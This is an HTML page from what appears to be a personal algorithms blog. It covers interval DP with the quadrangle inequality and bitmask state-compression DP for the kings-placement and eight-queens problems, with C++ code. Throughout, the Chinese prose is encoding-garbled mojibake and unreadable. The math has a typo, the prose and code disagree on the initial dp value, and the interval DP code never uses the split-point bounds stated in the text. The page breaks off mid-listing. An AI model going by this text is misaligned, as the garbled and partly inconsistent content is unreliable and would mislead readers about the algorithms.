\]</span> çŠ¶æ€è½¬ç§»: <span class="math display">\[
dp[i][j]=\min_{i\leq k&lt;j}(dp[i][k]+dp[k+1][j])+\sum_{i\leq k\leq
j}a[k]
\]</span> å‰ç¼€å’Œä¼˜åŒ–: <span class="math display">\[
\sum_{i\leq k\leq j}a[k]=prefix[j]-prefix[i-1]\\
dp[i][j]=\min_{i\leq k&lt;j}(dp[i][k]+dp[k+1][j])+prefix[j]-prefix[i-1]
\]</span> å››è¾¹å½¢ä¸ç­‰å¼ä¼˜åŒ–:</p>
<blockquote>
<p>å®é™…ä¸Šéœ€è¦è¯æ˜<span
class="math inline">\(dp[i][j]\)</span>,ä½†æ˜¯å¯ä»¥è¯æ˜åªè¦æ˜¯<span
class="math inline">\(w[i][j]\)</span>æ»¡è¶³å››è¾¹å½¢ä¸ç­‰å¼,<span
class="math inline">\(dp[i][j]\)</span>ä¹Ÿè‡ªåŠ¨æ»¡è¶³å››è¾¹å½¢ä¸ç­‰å¼,</p>
<p>å› æ­¤é¦–å…ˆè¯æ˜<span class="math inline">\(w[i][j]=\sum_{i\leq k\leq
j}a[k]=prefix[j]-prefix[i-1]\)</span>æ»¡è¶³åº”ç”¨å››è¾¹å½¢ä¸ç­‰å¼çš„æ¡ä»¶,å³è¯:</p>
<p>1.å®šä¹‰:å¯¹äºä»»æ„<span class="math inline">\(i&lt;i+1\leq
j&lt;j+1\)</span>,éƒ½æœ‰ <span class="math display">\[
w[i][j]+w[i+1][j+1]\leq w[i][j+1]+w[i+1][j]
\]</span> 2.å•è°ƒæ€§:å¯¹äºä»»æ„<span class="math inline">\(i\le i&#39;\le
j\le j&#39;\)</span>,éƒ½æœ‰ <span class="math display">\[
w[i][j&#39;]\ge w[i&#39;][j]
\]</span> è¯æ˜å¦‚ä¸‹:</p>
<p>å¯¹äºå®šä¹‰: <span class="math display">\[
w[i][j]+w[i+1][j+1]=prefix[j]-prefix[i-1]+prefix[j+1]-prefix[i]
\]</span></p>
<p><span class="math display">\[
w[i][j+1]+w[i+1][j]=prefix[j+1]-prefix[i-1]+prefix[j]-prefix[i]
\]</span></p>
<p>å·¦=å³,å®šä¹‰æˆç«‹</p>
<p>å¯¹äºå•è°ƒæ€§: <span class="math display">\[
w[i][j&#39;]-w[i&#39;][j]=prefix[j&#39;]-prefix[i-1]-prefix[j]+prefix[i&#39;-1]\\
=(prefix[j&#39;]-prefix[j])+(prefix[i&#39;-1]-preifx[i-1])
\]</span> ç”±äº<span class="math inline">\(i\le i&#39;\le j\le
j&#39;\)</span>,å¹¶ä¸”å‰ç¼€å‡½æ•°<span
class="math inline">\(prefix[i]\)</span>å•è°ƒä¸å‡,å› æ­¤ä¸Šå¼éè´Ÿ,å³ <span
class="math display">\[
w[i][j&#39;]\ge w[i&#39;][j]
\]</span> è¯æ¯•</p>
<p>ä¸‹é¢å°±å¯ä»¥ä½¿ç”¨å››è¾¹å½¢ä¸ç­‰å¼çš„æ€§è´¨å®šç†ä¼˜åŒ–äº†</p>
</blockquote>
<p><span class="math display">\[
dp[i][j]=\min_{s[i-1][j]\leq
k&lt;s[i][j+1]}(dp[i][k]+dp[k+1][j])+prefix[j]-prefix[i-1]
\]</span> è¿™é‡Œ<span
class="math inline">\(s[i][j]\)</span>çš„å®é™…æ„ä¹‰æ˜¯,å½“<span
class="math inline">\(dp[i][j]=\min_{i\leq
k&lt;j}(dp[i][k]+dp[k+1][j])+\sum_{i\leq k\leq
j}a[k]\)</span>åœ¨kå¤„å–å¾—æœ€å°å€¼æ—¶,æ­¤æ—¶çš„kå°±ä½œä¸º<span
class="math inline">\(s[i][j]\)</span></p>
<p>è¾¹ç•Œæ¡ä»¶æ˜¯<span class="math inline">\(s[i][i]=i\)</span></p>
<p><span
class="math inline">\(s[i][j]\)</span>çš„è®¡ç®—å¹¶ä¸æ˜¯å¤´é“åœ°ä»iåˆ°jéå†kå…ˆæ±‚<span
class="math inline">\(s[i][j]\)</span>,è€Œæ˜¯è·Ÿéšdpä¸€èµ·æ±‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">310</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> dp[maxn][maxn];</span><br><span class="line"><span class="type">int</span> s[maxn][maxn];</span><br><span class="line"><span class="type">int</span> prefix[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        s[i][i]=i;</span><br><span class="line">        dp[i][i]=<span class="number">0</span>;</span><br><span class="line">        prefix[i]=prefix[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> delta=<span class="number">1</span>;delta&lt;=n;++delta)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=n;++i)&#123;</span><br><span class="line">            <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">            <span class="type">int</span> temp_min=INF;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[i][k]+dp[k<span class="number">+1</span>][j]&lt;temp_min)&#123;</span><br><span class="line">                    temp_min=dp[i][k]+dp[k<span class="number">+1</span>][j];</span><br><span class="line">                    s[i][j]=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j]=temp_min+prefix[j]-prefix[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[<span class="number">1</span>][n]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è‡³äºå››è¾¹å½¢ä¸ç­‰å¼çš„æ­£ç¡®æ€§,ç°åœ¨è¿˜æ²¡æœ‰å®Œå…¨è½¬é˜´,å•¥æ—¶å€™è„‘å­ä¸æµ‘äº†å†çœ‹å§...</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/22/%E7%8A%B6%E5%8E%8BDP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/22/%E7%8A%B6%E5%8E%8BDP/" class="post-title-link" itemprop="url">åŠ¨æ€è§„åˆ’-çŠ¶å‹DP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-22 23:48:00" itemprop="dateCreated datePublished" datetime="2022-12-22T23:48:00+08:00">2022-12-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-06-01 09:38:00" itemprop="dateModified" datetime="2023-06-01T09:38:00+08:00">2023-06-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="åŠ¨æ€è§„åˆ’-çŠ¶å‹dp">åŠ¨æ€è§„åˆ’-çŠ¶å‹DP</h1>
<p>çŠ¶æ€å‹ç¼©DP,ä¹Ÿå°±æ˜¯æŠŠå±€é¢çŠ¶æ€å‹ç¼©åˆ°ä¸€ä¸ªæ•´æ•°ä¸­,ç”¨æ•´æ•°çš„è¿ç®—è¡¨ç¤ºçŠ¶æ€è½¬ç§»</p>
<p>æ¨¡æ¿é¢˜ä¸€èˆ¬æ˜¯,å¾€æ£‹ç›˜ä¸Šæ”¾åŒä¸€ç§æ£‹å­,å¹¶ä¸”ä¸èƒ½è®©ä»–ä»¬ææ¶,é—®é¢˜æœ‰ä¸¤ç§:</p>
<p>ä¸€å…±è¦æ”¾kä¸ª,æ±‚æ”¾æ³•æœ‰å‡ ç§?</p>
<p>æœ€å¤šæ”¾å¤šå°‘ä¸ª?</p>
<p><code>g++ -std=c++11 -O2</code></p>
<h2 id="p1896-å…«ç‹å…«"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1896">P1896 å…«ç‹å…«</a></h2>
<p>ä¸€ä¸ª<span class="math inline">\(N\times N\)</span>çš„å›½è±¡æ£‹ç›˜ä¸Šæ”¾<span
class="math inline">\(k\)</span>ä¸ªç‹å…«,è¦æ±‚è¿™kä¸ªç‹å…«ä¸èƒ½ææ¶.æ±‚æœ‰å¤šå°‘ç§æ”¾ç‹å…«çš„æ–¹æ³•</p>
<p>å…¶ä¸­<span class="math inline">\(1\leq N\leq 9,0\leq k\leq N\times
N\)</span></p>
<p>ç±»ä¼¼äºå…«çš‡åé—®é¢˜,ä½†æ˜¯ç‹å…«çš„æ”»å‡»èŒƒå›´åªæœ‰å‘¨å›´å…«æ ¼,æ›´è¿‘</p>
<h3 id="çŠ¶æ€å‹ç¼©">çŠ¶æ€å‹ç¼©</h3>
<p>æ£‹ç›˜çš„æ¯ä¸ªæ ¼å­,è¦ä¹ˆæœ‰ç‹å…«,è¦ä¹ˆæ²¡ç‹å…«,å› æ­¤
å¯ä»¥ç”¨1è¡¨ç¤ºæœ‰,0è¡¨ç¤ºæ— çš„çŠ¶æ€</p>
<p>é‚£ä¹ˆæ•´ä¸ªæ£‹ç›˜å¯ä»¥çœ‹æˆæœ‰Nè¡Œ,æ¯è¡Œæœ‰Nä¸ªæ ¼å­</p>
<p>æ¯”å¦‚ä¸€ä¸ª<span class="math inline">\(4\times
4\)</span>,æ²¡æœ‰ç‹çš„æ£‹ç›˜å°±å¯ä»¥æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å°†ä¸€è¡Œå‹ç¼©ä¸ºä¸€ä¸ªæ•´æ•°,æœ€å·¦ä¾§æ˜¯æœ€ä½ä½æ¯”å¦‚</p>
<p>1 0 0 1 0 1 0 -&gt;0101001b=41</p>
<p>å¦‚æœæƒ³è®©ä¸€è¡Œä¸­çš„ç‹å…«ä¸ææ¶,é‚£ä¹ˆä¸èƒ½æœ‰ä»»ä½•ä¸¤ä¸ª1ç›¸é‚».è¿™ä¸€ç‚¹æ€ä¹ˆåˆ¤æ–­å‘¢?</p>
<p>å‡è®¾current_state=41è¡¨ç¤ºå½“å‰è¡ŒçŠ¶æ€</p>
<p>é‚£ä¹ˆ<code>(current_state&amp;((current_state&gt;&gt;1)|current_state&lt;&lt;1))</code>å°±å¯ä»¥åˆ¤æ–­æœ‰æ²¡æœ‰ç‹å…«ææ¶</p>
<p>ä¸ºå•¥å‘¢?</p>
<p>æ¯”å¦‚çŠ¶æ€41æ˜¾ç„¶æ˜¯åˆæ³•çš„</p>
<table>
<colgroup>
<col style="width: 83%" />
<col style="width: 6%" />
<col style="width: 10%" />
</colgroup>
<thead>
<tr>
<th>çŠ¶æ€</th>
<th>æ•´æ•°</th>
<th>äºŒè¿›åˆ¶</th>
</tr>
</thead>
<tbody>
<tr>
<td>current_state</td>
<td>41</td>
<td>0101001</td>
</tr>
<tr>
<td>current_state&lt;&lt;1</td>
<td></td>
<td>1010010</td>
</tr>
<tr>
<td>current_state&gt;&gt;1</td>
<td></td>
<td>0010100</td>
</tr>
<tr>
<td>(current_state&lt;&lt;1)|(current_state&gt;&gt;1)</td>
<td></td>
<td>1010110</td>
</tr>
<tr>
<td>current_state</td>
<td></td>
<td>0101001</td>
</tr>
<tr>
<td>(current_state&amp;((current_state&gt;&gt;1)|(current_state&lt;&lt;1))</td>
<td></td>
<td>0000000</td>
</tr>
</tbody>
</table>
<p>å¦‚ä½•è®©ç›¸é‚»ä¸¤è¡Œçš„ç‹å…«ä¸ææ¶å‘¢?</p>
<p><code>(current_state&amp;((previous_state)|(previous_state&lt;&lt;1)|(previous_state&gt;&gt;1)))</code></p>
<p>é“ç†ç±»ä¼¼äºä¸è®©ä¸€è¡Œä¸­çš„ç‹å…«ææ¶,ä¸Šä¸€è¡Œçš„ä¸€ä¸ªç‹å…«,é‚£ä¹ˆæœ¬è¡Œä¸­è¯¥ç‹å…«çš„å·¦ä¸‹,æ­£ä¸‹,å³ä¸‹éƒ½ä¸èƒ½æœ‰ç‹å…«</p>
<h3 id="çŠ¶æ€è½¬ç§»">çŠ¶æ€è½¬ç§»</h3>
<p>è®¾è®¡çŠ¶æ€:</p>
<p><code>dp[currnet_row][cnt_king_used][current_state]</code>è¡¨ç¤º:</p>
<p>å·²ç»å®‰æ’äº†<code>[1,current_row]</code>çš„ç‹å…«,</p>
<p>å·²ç»å®‰æ’äº†<code>cnt_king_used</code>ä¸ªç‹å…«,</p>
<p>å½“å‰è¡Œ,ä¹Ÿå°±æ˜¯ç¬¬<code>current_row</code>çš„çŠ¶æ€æ˜¯<code>current_state</code></p>
<p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹: <span class="math display">\[
\begin{aligned}
&amp;dp[current\_row][cnt\_king\_used][current\_state]=\\
&amp;\sum_{previous\_state}dp[previous\_row][cnt\_kings\_used-cnt\_kings\_of[current\_row]\
][previous\_state]
\end{aligned}
\]</span> åˆå§‹çŠ¶æ€:</p>
<p>å‰0è¡Œ(ä¸å­˜åœ¨è¿™ä¸€è¡Œ),æ”¾äº†0ä¸ªç‹å…«,çŠ¶æ€æ˜¾ç„¶æ˜¯0,æ­¤æ—¶çš„æ‘†æ”¾æ–¹æ³•<code>dp[0][0][0]=0</code></p>
<h3 id="å®Œæ•´ç¨‹åº">å®Œæ•´ç¨‹åº</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[<span class="number">10</span>][<span class="number">100</span>][<span class="number">2000</span>];<span class="comment">//dp[i][j][k]å‰iè¡Œä¸­å·²ç»æ‘†äº†jä¸ªç‹,å…¶ä¸­ç¬¬iè¡Œçš„çŠ¶æ€æ˜¯k.çš„æ•°é‡</span></span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;legal_states;</span><br><span class="line"><span class="type">int</span> cnt_kings_in_state[<span class="number">2000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isLegalState</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((k&amp;((k&lt;&lt;<span class="number">1</span>)|(k&gt;&gt;<span class="number">1</span>)))==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isInvasion</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a&amp;((b&lt;&lt;<span class="number">1</span>)|(b&gt;&gt;<span class="number">1</span>)|b));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="type">int</span> current_state;</span><br><span class="line">    <span class="type">int</span> cnt_state;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);i++)&#123;</span><br><span class="line">        current_state=i;</span><br><span class="line">        cnt_state=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(current_state)&#123;</span><br><span class="line">            cnt_state+=current_state&amp;<span class="number">1</span>;</span><br><span class="line">            current_state&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt_kings_in_state[i]=cnt_state;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isLegalState</span>(i))&#123;</span><br><span class="line">            legal_states.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> current_row=<span class="number">1</span>;current_row&lt;=n;current_row++)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:legal_states)&#123;<span class="comment">//å½“å‰è¡Œåˆæ³•çŠ¶æ€</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_state:legal_states)&#123;<span class="comment">//ä¸Šä¸€è¡Œçš„åˆæ³•çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isInvasion</span>(current_state,previous_state)==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(</span><br><span class="line">                        <span class="type">int</span> cnt_tot_kings=cnt_kings_in_state[current_state];</span><br><span class="line">                        cnt_tot_kings&lt;=k;</span><br><span class="line">                        ++cnt_tot_kings</span><br><span class="line">                    )&#123;</span><br><span class="line">                        </span><br><span class="line">                        dp[current_row][cnt_tot_kings][current_state]+=</span><br><span class="line">                            dp[previous_row][cnt_tot_kings-cnt_kings_in_state[current_state]][previous_state];</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:legal_states)&#123;</span><br><span class="line">        result+=dp[n][k][current_state];</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="section"></h3>
<h2 id="p1219-å…«çš‡å"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1219">P1219 å…«çš‡å</a></h2>
<p><span class="math inline">\(N\times
N\)</span>çš„æ£‹ç›˜ä¸Šè¦æ”¾Nçš„çš‡å,è¦æ±‚Nä¸ªçš‡åä¸èƒ½ææ¶,æ±‚å¤šå°‘ç§æ”¾çš‡åçš„æ–¹æ³•</p>
<p><span class="math inline">\(6\leq N\leq 13\)</span></p>
<h3 id="çŠ¶æ€å‹ç¼©-1">çŠ¶æ€å‹ç¼©</h3>
<p>Nè¡Œ,æ¯è¡ŒNä½,æ¯ä½0è¡¨ç¤ºæ²¡æœ‰çš‡å,1è¡¨ç¤ºæœ‰çš‡å</p>
<p>ä¸€ä¸ªintæœ‰32ä½,è¶³å¤Ÿè¡¨ç¤ºä¸€è¡Œ</p>
<p>æ¯è¡Œçš„æœ€å·¦ä¾§æ ¼å­æ˜¯intçš„æœ€ä½ä½</p>
<h3 id="çŠ¶æ€è½¬ç§»-1">çŠ¶æ€è½¬ç§»</h3>
<p>è®¾è®¡çŠ¶æ€</p>
<p><span
class="math inline">\(dfs(col\_state,diagonal\_state,rdiagonal\_state,row)\)</span></p>
<p>è¡¨ç¤ºå½“å‰è¦æ”¾ç¬¬rowè¡Œçš„çš‡å,</p>
<p>ä¹‹å‰æ‰€æœ‰çš„çš‡åæ§åˆ¶çš„æ‰€æœ‰åˆ—å­˜æ”¾åœ¨<code>col_state</code>ä¸­,</p>
<p>ä¹‹å‰æ‰€æœ‰çš‡åæ§åˆ¶çš„å·¦ä¸Šåˆ°å³ä¸‹çš„æ–œçº¿<strong>åœ¨æœ¬è¡Œçš„å½±å“</strong>å­˜æ”¾åœ¨<code>diagonal_state</code>ä¸­</p>
<p>ä¹‹å‰æ‰€æœ‰çš‡åæ§åˆ¶çš„å³ä¸Šåˆ°å·¦ä¸‹çš„æ–œçº¿åœ¨æœ¬è¡Œçš„å½±å“å­˜æ”¾åœ¨<code>äººdiagonal_state</code>ä¸­</p>
<p>æ˜¾ç„¶<span
class="math inline">\(dfs(col\_state,diagonal\_state,rdiagonal\_state,row)\)</span>çš„ä»»åŠ¡å°±æ˜¯,ç»“åˆå‰ä¸‰ä¸ªå‚æ•°,åœ¨æœ¬è¡Œæ‰¾ä¸€ä¸ªå®‰å…¨ä½ç½®æ”¾ä¸€ä¸ªçš‡å,ç„¶åè¿›å…¥ä¸‹ä¸€å±‚dfs</p>
<p>å•¥æ„æ€å‘¢?8</p>
<p>å‡å¦‚ç°åœ¨è¦æ”¾ç¬¬å››è¡Œ,å‰ä¸‰è¡Œçš„çš‡åå¦‚å›¾æ‰€ç¤º</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114520664.png"
alt="image-20221222114520664" />
<figcaption aria-hidden="true">image-20221222114520664</figcaption>
</figure>
<p>è¿™ä¸‰ä¸ªçš‡åæ§åˆ¶çš„åˆ—å¯¹ç¬¬å››è¡Œçš„å½±å“å¦‚å›¾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114303317.png"
alt="image-20221222114303317" />
<figcaption aria-hidden="true">image-20221222114303317</figcaption>
</figure>
<p>é‚£ä¹ˆæ­¤æ—¶ç¬¬å››è¡Œçš„2,4,6åˆ—å°±ä¸å…è®¸æ”¾çš‡å,</p>
<p>æ­¤æ—¶<code>col_state=00101010b</code>,(æœ€å·¦ä¾§æ ¼å­åœ¨æœ€ä½ä½)è¡¨ç¤ºç¬¬2,4,6åˆ—ä¸å…è®¸ä½¿ç”¨</p>
<p>å‰ä¸‰ä¸ªçš‡ååœ¨å·¦ä¸Šåˆ°å³ä¸‹çš„æ–œçº¿ä¸Š,å¯¹ç¬¬å››è¡Œäº§ç”Ÿçš„å½±å“å¦‚å›¾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114701433.png"
alt="image-20221222114701433" />
<figcaption aria-hidden="true">image-20221222114701433</figcaption>
</figure>
<p>å³æ­¤æ—¶<code>diagonal_state=01110000</code>(æœ€å·¦ä¾§æ ¼å­åœ¨æœ€ä½ä½),è¡¨ç¤ºç¬¬5,6,7åˆ—ä¸å…è®¸ä½¿ç”¨</p>
<p><code>rdiagonal_state</code>åŒç†</p>
<p>ä¸‹é¢è€ƒè™‘è¿™ä¸‰ä¸ªè¡¨ç¤ºå ç”¨çŠ¶æ€çš„å‚æ•°å¦‚ä½•ç»´æŠ¤</p>
<p>æ˜¾ç„¶col_stateæœ€å®¹æ˜“ç»´æŠ¤,åªè¦ç¬¬iåˆ—ä¸Šæœ‰è¿‡çš‡å,col_stateçš„ç›¸åº”äºŒè¿›åˆ¶ä½å°±ç½®1</p>
<p>å¯¹äºdiagonal_state,å‡è®¾æœ¬è¡Œçš„çš‡åæ”¾åœ¨ç¬¬iåˆ—,é‚£ä¹ˆä»–ä¼šå½±å“ä¸‹ä¸€è¡Œçš„i+1åˆ—,å› æ­¤ä»å½“å‰è¡Œçš„dfsè¿›å…¥ä¸‹ä¸€è¡Œçš„dfsæ—¶,åªéœ€è¦æŠŠdiagonal_stateåŠ ä¸Šæœ¬è¡Œçš„çš‡ååˆ—ä½ç½®,ç„¶åå³ç§»1ä½ä¼ é€’ç»™ä¸‹å±‚dfs</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222150322875.png"
alt="image-20221222150322875" />
<figcaption aria-hidden="true">image-20221222150322875</figcaption>
</figure>
<p>ç»¼ä¸Š,å¯¹äºå½“å‰è¡Œçš„dfs,æ”¾ç½®çš‡åæ—¶éœ€è¦è€ƒè™‘çš„å› ç´ å¦‚å›¾:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222150632385.png"
alt="image-20221222150632385" />
<figcaption aria-hidden="true">image-20221222150632385</figcaption>
</figure>
<p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹é‡‡ç”¨"æ¨"çš„æ–¹å¼,ä»rowå±‚æ¨è¿›åˆ°row+1å±‚ <span
class="math display">\[
\begin{aligned}
&amp;dfs(col\_state,diagonal\_state,rdiagonal\_state,row)\\ \Rightarrow
&amp;dfs(col\_state|current\_state,(diagonal\_state|current\_state)&gt;&gt;1,(rdiagonal\_state|current\_state)&lt;&lt;1,row+1)
\end{aligned}
\]</span></p>
<h3 id="å®Œæ•´ä»£ç ">å®Œæ•´ä»£ç </h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 